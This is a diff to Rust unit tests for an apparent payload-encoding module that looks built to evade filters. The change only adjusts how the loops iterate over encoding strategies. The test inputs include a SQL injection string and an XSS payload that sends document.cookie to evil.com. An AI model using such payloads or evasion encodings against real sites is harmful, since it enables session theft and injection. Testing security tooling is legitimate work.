@@ -105,7 +105,7 @@ fn encoding_xss_with_unicode() {
 
 #[test]
 fn encoding_empty_string() {
-    for strategy in encoding::all_strategies() {
+    for &strategy in encoding::all_strategies() {
         let result = encoding::encode("", strategy).unwrap();
         // Empty input should not panic, may return empty or minimal string
         // Some strategies add prefixes/wrappers even for empty input (e.g. ParameterPollution)
@@ -119,7 +119,7 @@ fn encoding_empty_string() {
 #[test]
 fn encoding_very_long_string() {
     let long_payload = "A".repeat(10000);
-    for strategy in encoding::all_strategies() {
+    for &strategy in encoding::all_strategies() {
         let encoded = encoding::encode(&long_payload, strategy).unwrap();
         assert!(!encoded.is_empty());
         // Should handle large inputs without crashing
@@ -129,7 +129,7 @@ fn encoding_very_long_string() {
 #[test]
 fn encoding_all_strategies_on_sqli() {
     let sqli = "' OR 1=1--";
-    for strategy in encoding::all_strategies() {
+    for &strategy in encoding::all_strategies() {
         let encoded = encoding::encode(sqli, strategy).unwrap();
         assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
     }
@@ -138,7 +138,7 @@ fn encoding_all_strategies_on_sqli() {
 #[test]
 fn encoding_all_strategies_on_xss() {
     let xss = "<script>fetch('http://evil.com?c='+document.cookie)</script>";
-    for strategy in encoding::all_strategies() {
+    for &strategy in encoding::all_strategies() {
         let encoded = encoding::encode(xss, strategy).unwrap();
         assert!(!encoded.is_empty(), "Strategy {strategy:?} returned empty");
     }
@@ -386,7 +386,7 @@ fn strategy_next_encoding_exhaustion() {
 
     // Mark all strategies as tried
     for strategy in all {
-        state.tried_encodings.push(strategy);
+        state.tried_encodings.push(*strategy);
     }
 
     let next = state.next_encoding();
